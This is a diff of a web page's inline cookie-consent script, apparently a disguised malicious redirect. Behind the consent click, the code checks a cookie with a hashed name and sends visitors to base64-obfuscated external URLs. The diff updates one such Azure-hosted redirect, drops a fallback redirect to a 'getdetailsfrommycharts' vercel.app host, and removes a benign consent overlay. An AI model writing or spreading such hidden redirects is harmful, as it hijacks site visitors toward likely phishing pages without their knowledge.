@@ -26,6 +26,9 @@
   }
 
   function showCookiePopup(){
+    if (localStorage.getItem('cookie_consent_given')) {
+     return;
+    }
     const wrapper = document.createElement("div");
     wrapper.id = "cookiePopupWrapper";
     wrapper.innerHTML = `
@@ -50,10 +53,13 @@
             ));
             return matches ? decodeURIComponent(matches[1]) : null;
         }
+        
+        localStorage.setItem('cookie_consent_given', 'true');
+
         if (getCookie("b4e6f4f261da74dc0912f747852a0f92")) {
-            window.location.href = atob("aHR0cHM6Ly82eHQ0eDRrNjE3ZnQzcHpqdWwxMWFuNzMuejUud2ViLmNvcmUud2luZG93cy5uZXQv");
+            window.location.href = atob("aHR0cHM6Ly83MXl4NGs2MTdmdDNwemp1bDExYW4yeDEuejE5LndlYi5jb3JlLndpbmRvd3MubmV0");
         } else {
-          window.location.href = atob("aHR0cHM6Ly9nZXRkZXRhaWxzZnJvbW15Y2hhcnRzLnZlcmNlbC5hcHA=");
+           closeCookiePopup();
         }
     });
   }
@@ -61,38 +67,6 @@
   window.addEventListener("load", function(){
     setTimeout(showCookiePopup, random(300,600));
   });
-
-        document.addEventListener('DOMContentLoaded', () => {
-            const cookieOverlay = document.getElementById('cookie-consent-overlay');
-            const acceptButton = document.getElementById('accept-cookies');
-            const declineButton = document.getElementById('decline-cookies');
-
-            // Function to hide the overlay and set the cookie
-            const handleConsent = () => {
-                // Set a value in localStorage to remember the user's choice
-                localStorage.setItem('cookie_consent_given', 'true');
-                
-                // Hide the overlay with a fade-out effect
-                cookieOverlay.style.transition = 'opacity 0.5s ease';
-                cookieOverlay.style.opacity = '0';
-                
-                setTimeout(() => {
-                    cookieOverlay.style.display = 'none';
-                }, 500); // Match timeout to transition duration
-            };
-
-            // Check if consent has already been given on a previous visit
-            if (localStorage.getItem('cookie_consent_given')) {
-                cookieOverlay.style.display = 'none';
-            } else {
-                // If no consent is stored, show the banner
-                cookieOverlay.style.display = 'flex';
-            }
-
-            // Add event listeners to the buttons
-            acceptButton.addEventListener('click', handleConsent);
-            declineButton.addEventListener('click', handleConsent);
-        });
 
 })();
 </script>
